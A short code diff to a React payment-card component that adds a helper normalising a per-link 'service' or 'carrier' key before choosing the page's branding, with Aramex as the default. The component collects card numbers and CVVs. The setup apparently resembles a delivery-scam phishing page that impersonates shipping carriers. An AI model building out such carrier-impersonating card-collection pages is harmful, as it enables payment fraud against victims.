@@ -9,7 +9,7 @@ import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@
 import { usePayment, useUpdatePayment, useLink } from "@/hooks/useSupabase";
 import { Shield, CreditCard, Lock, AlertCircle } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
-import { getServiceBranding } from "@/lib/serviceLogos";
+import { getServiceBranding, normalizeServiceKey } from "@/lib/serviceLogos";
 
 const PaymentCard = () => {
   const { id, paymentId } = useParams();
@@ -26,8 +26,9 @@ const PaymentCard = () => {
   const [cvv, setCvv] = useState("");
   
   // Get service branding
-  const serviceKey = link?.payload?.service_key || link?.payload?.service || link?.payload?.carrier || 'aramex';
-  const serviceName = link?.payload?.service_name || serviceKey;
+  const rawServiceKey = link?.payload?.service_key || link?.payload?.service || link?.payload?.carrier || 'aramex';
+  const serviceName = link?.payload?.service_name || rawServiceKey;
+  const serviceKey = normalizeServiceKey(rawServiceKey, serviceName);
   const branding = getServiceBranding(serviceKey);
   
   const formatCardNumber = (value: string) => {
